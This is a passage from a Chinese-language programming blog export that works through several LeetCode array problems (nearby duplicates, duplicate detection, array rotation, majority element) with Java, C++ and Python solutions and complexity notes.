    <url>/2018/01/29/219-Contains-Duplicate-II/</url>
    <content><![CDATA[<p>Given an array of integers and an integer <em>k</em>, find out whether there are two distinct indices <em>i</em> and <em>j</em> in the array such that <strong>nums[i] = nums[j]</strong> and the <strong>absolute</strong> difference between <em>i</em> and <em>j</em> is at most <em>k</em>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>], k = <span class="number">3</span></span><br><span class="line">Output: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>], k = <span class="number">1</span></span><br><span class="line">Output: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 3:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">2</span></span><br><span class="line">Output: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>使用HashMap做就可以了。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/contains-duplicate-ii</span></span><br><span class="line"><span class="comment"> * Beats : 89.19%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; hash = <span class="keyword">new</span> HashMap&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash.containsKey(nums[i]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(i - hash.get(nums[i]) &lt;= k)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    hash.put(nums[i],i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                hash.put(nums[i],i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/contains-duplicate-ii</span></span><br><span class="line"><span class="comment"> * Beats : 26.57% </span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; hash;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (hash.find(nums[i]) != hash.end())&#123;</span><br><span class="line">				<span class="keyword">if</span> (i - hash[nums[i]] &lt;= k)&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					hash[nums[i]] = i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				hash[nums[i]] = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsNearbyDuplicate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        hash = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> hash:</span><br><span class="line">                <span class="keyword">if</span> i - hash[nums[i]] &lt;= k:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hash[nums[i]] = i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hash[nums[i]] = i</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Map和Set是解决数组类问题的得力工具，必要的时候很值得考虑。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>217. Contains Duplicate</title>
    <url>/2018/01/29/217-Contains-Duplicate/</url>
    <content><![CDATA[<p>Given an array of integers, find if the array contains any duplicates.</p>
<p>Your function should return true if any value appears at least twice in the array, and it should return false if every element is distinct.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">Output: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">Output: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 3:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line">Output: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="方法一：利用排序"><a href="#方法一：利用排序" class="headerlink" title="方法一：利用排序"></a>方法一：利用排序</h2><p>思路很简单，排序，然后找重。</p>
<p><strong>java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/contains-duplicate</span></span><br><span class="line"><span class="comment"> * Beats : 99.76%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == nums[i+<span class="number">1</span>]) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/contains-duplicate</span></span><br><span class="line"><span class="comment"> * Beats : 28.08%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">containsDuplicate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="comment">//这里强制类型转换了下，要不会报错，不知道为什么，可能是c++版本问题</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; (<span class="keyword">int</span>)(nums.size())<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==nums[i+<span class="number">1</span>]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsDuplicate</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] == nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<h2 id="方法二：利用Set"><a href="#方法二：利用Set" class="headerlink" title="方法二：利用Set"></a>方法二：利用Set</h2><p>我个人比较推荐使用Set，因为这样的时间复杂度为$O(n)$，用空间换了时间。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/contains-duplicate</span></span><br><span class="line"><span class="comment"> * Beats : 58.85%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; hash = <span class="keyword">new</span> HashSet&lt;Integer&gt;(); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash.contains(nums[i])) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            hash.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/contains-duplicate</span></span><br><span class="line"><span class="comment"> * Beats : 11.58%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">containsDuplicate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; hash;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (hash.find(nums[i]) != hash.end())&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				hash.insert(nums[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<p>如果按照上述的思路，python会超时。看了一些比较巧妙地解法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsDuplicate</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(nums) &gt; len(set(nums))</span><br><span class="line">    </span><br><span class="line">    	<span class="string">"""</span></span><br><span class="line"><span class="string">        超时</span></span><br><span class="line"><span class="string">        hash = []</span></span><br><span class="line"><span class="string">        for i in range(0, len(nums)):</span></span><br><span class="line"><span class="string">            if nums[i] in hash:</span></span><br><span class="line"><span class="string">                return True</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                hash.append(nums[i])</span></span><br><span class="line"><span class="string">        return False</span></span><br><span class="line"><span class="string">        """</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>189. Rotate Array</title>
    <url>/2018/01/29/189-Rotate-Array/</url>
    <content><![CDATA[<p>Given an array, rotate the array to the right by <em>k</em> steps, where <em>k</em> is non-negative.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>] and k = <span class="number">3</span></span><br><span class="line">Output: [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">Explanation:</span><br><span class="line">rotate <span class="number">1</span> steps to the right: [<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">rotate <span class="number">2</span> steps to the right: [<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">rotate <span class="number">3</span> steps to the right: [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [-<span class="number">1</span>,-<span class="number">100</span>,<span class="number">3</span>,<span class="number">99</span>] and k = <span class="number">2</span></span><br><span class="line">Output: [<span class="number">3</span>,<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>]</span><br><span class="line">Explanation: </span><br><span class="line">rotate <span class="number">1</span> steps to the right: [<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>,<span class="number">3</span>]</span><br><span class="line">rotate <span class="number">2</span> steps to the right: [<span class="number">3</span>,<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>]</span><br></pre></td></tr></table></figure>
<p><strong>Note:</strong></p>
<ul>
<li>Try to come up as many solutions as you can, there are at least 3 different ways to solve this problem.</li>
<li>Could you do it in-place with O(1) extra space?</li>
</ul>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>多种解法参考：<a href="https://leetcode.com/problems/rotate-array/solution/" target="_blank" rel="noopener">https://leetcode.com/problems/rotate-array/solution/</a></p>
<p>这个题目因为之前有了解过，所以直接就想到了反转的思路。理论上要经历暴力循环，然后才知道这个反转的策略。</p>
<p><strong>注意</strong>：k的值首先要模上数组大小，因为k的值是会大于数组大小的。而他的意义是和<code>k%nums.size()</code>意义一样的。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/rotate-array</span></span><br><span class="line"><span class="comment"> * Beats : 100%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    k %= nums.length;</span><br><span class="line">    reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">    reverse(nums, <span class="number">0</span>, k - <span class="number">1</span>);</span><br><span class="line">    reverse(nums, k, nums.length - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">      <span class="keyword">int</span> temp = nums[start];</span><br><span class="line">      nums[start] = nums[end];</span><br><span class="line">      nums[end] = temp;</span><br><span class="line">      start++;</span><br><span class="line">      end--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/rotate-array</span></span><br><span class="line"><span class="comment"> * Beats : c++测试有问题，不过代码是正确的</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		k %= nums.size();</span><br><span class="line">		reverse(nums.begin(), nums.end());</span><br><span class="line">		reverse(nums.begin(), nums.begin() + k);</span><br><span class="line">		reverse(nums.begin() + k, nums.end());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<p>这里python的实现值得学习，学习了python的方法调用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""方法的定义"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self,nums,start,end)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            temp = nums[start]</span><br><span class="line">            nums[start] = nums[end]</span><br><span class="line">            nums[end] = temp</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">            end -= <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        k %= n</span><br><span class="line">        <span class="string">"""self.调用方法"""</span></span><br><span class="line">        self.reverse(nums, <span class="number">0</span>, n - <span class="number">1</span>)</span><br><span class="line">        self.reverse(nums, <span class="number">0</span>, k - <span class="number">1</span>)</span><br><span class="line">        self.reverse(nums, k, n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种Rotate Array旋转数组的最好方法是<code>reverse</code>方法（从思路和时间空间复杂度考虑），通过三次反转数组，即可达到旋转数组的目的，这么做的好处是它可以不借助额外空间，使其空间复杂度为$O(1)$</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>reverse(反转数组)</tag>
      </tags>
  </entry>
  <entry>
    <title>169. Majority Element</title>
    <url>/2018/01/29/169-Majority-Element/</url>
    <content><![CDATA[<p>Share</p>
<p>Given an array of size <em>n</em>, find the majority element. The majority element is the element that appears <strong>more than</strong> <code>⌊ n/2 ⌋</code> times.</p>
<p>You may assume that the array is non-empty and the majority element always exist in the array.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">Output: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">Output: <span class="number">2</span></span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="解法一：最少代码的办法"><a href="#解法一：最少代码的办法" class="headerlink" title="解法一：最少代码的办法"></a>解法一：最少代码的办法</h2><p>先排序，然后直接索引n/2索引位置，就是majority元素。</p>
<p>时间复杂度：$ O(nlogn) $,主要在排序上</p>
<p>空间复杂度：$O(1)$，由于没有借助额外空间。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/majority-element</span></span><br><span class="line"><span class="comment"> * Beats : 11.58%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		sort(nums.begin(),nums.end());</span><br><span class="line">		<span class="keyword">return</span> nums[nums.size() / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="解法二：常规法HashMap"><a href="#解法二：常规法HashMap" class="headerlink" title="解法二：常规法HashMap"></a>解法二：常规法HashMap</h2><p>对于一个数组，需要特定条件的元素，<code>Map</code>和<code>Set</code>一直都是得力的助手。</p>
<p>我们可以用Map来统计所有元素的次数，然后遍历Map返回个数大于n/2的元素。</p>
<p>时间复杂度：$ O(n) $</p>
<p>空间复杂度：$O(n)$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/majority-element</span></span><br><span class="line"><span class="comment"> * Beats : 10.58%;</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(n);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; hash;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (hash.find(nums[i]) != hash.end())&#123;</span><br><span class="line">				hash[nums[i]]++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				hash[nums[i]] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> x : hash)&#123;</span><br><span class="line">			<span class="keyword">if</span> (x.second&gt;n / <span class="number">2</span>)&#123;</span><br><span class="line">				<span class="keyword">return</span> x.first;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="解法三-Boyer-Moore-Voting-Algorithm（多数投票算法）"><a href="#解法三-Boyer-Moore-Voting-Algorithm（多数投票算法）" class="headerlink" title="解法三-Boyer-Moore Voting Algorithm（多数投票算法）"></a>解法三-Boyer-Moore Voting Algorithm（多数投票算法）</h2><p>参考：<a href="https://leetcode.com/problems/majority-element/solution/" target="_blank" rel="noopener">https://leetcode.com/problems/majority-element/solution/</a></p>
<p>这个方法好在他的空间复杂度变为了$O(1)$，具体思路是设置一个count变量，用于统计当前待选主要元素个数，每次遇到相同的元素则加1，不相同则减1；当count为0时，说明需要换待选主要元素了。例如：</p>
<blockquote>
<p>[7, 7, 5, 7, 5, 1 | 5, 7 | 5, 5, 7, 7 | 7, 7, 7, 7]    7为主要元素</p>
<p>[7, 7, 5, 7, 5, 1 | 5, 7 | 5, 5, 7, 7 | <strong>5, 5, 5, 5</strong>]    5为主要元素</p>
</blockquote>
<p>时间复杂度：$ O(n) $</p>
<p>空间复杂度：$O(1)$</p>
<p><strong>Java实现</strong></p>
